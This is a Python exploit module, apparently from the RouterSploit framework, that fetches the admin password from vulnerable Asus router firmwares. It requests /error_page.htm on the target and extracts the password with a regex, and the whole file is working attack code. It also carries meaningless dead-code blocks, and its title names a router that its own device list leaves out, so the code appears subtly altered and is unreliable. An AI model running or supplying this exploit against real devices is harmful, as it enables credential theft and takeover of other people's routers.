import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Asus RT-N16 Password Disclosure', 'description': 'Module exploits password disclosure vulnerability in Asus RT-N16 devices that allows to fetch credentials for the device.', 'authors': ('Harry Sintonen', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://sintonen.fi/advisories/asus-router-auth-bypass.txt',), 'devices': ('ASUS RT-N10U, firmware 3.0.0.4.374_168', 'ASUS RT-N56U, firmware 3.0.0.4.374_979', 'ASUS DSL-N55U, firmware 3.0.0.4.374_1397', 'ASUS RT-AC66U, firmware 3.0.0.4.374_2050', 'ASUS RT-N15U, firmware 3.0.0.4.374_16', 'ASUS RT-N53, firmware 3.0.0.4.374_311')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(8080, 'Target HTTP port')

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        response = self.http_request(method='GET', path='/error_page.htm')
        if response is None:
            return
        creds = re.findall("if\\('1' == '0' \\|\\| '(.+?)' == 'admin'\\)", response.text)
        if len(creds):
            c = [('admin', creds[0])]
            print_success('Credentials found!')
            headers = ('Login', 'Password')
            print_table(headers, *c)
        else:
            print_error('Credentials could not be found')

    @mute
    def check(self):
        if False:
            i = 10
            return i + 15
        response = self.http_request(method='GET', path='/error_page.htm')
        if response is None:
            return False
        creds = re.findall("if\\('1' == '0' \\|\\| '(.+?)' == 'admin'\\)", response.text)
        if len(creds):
            return True
        return False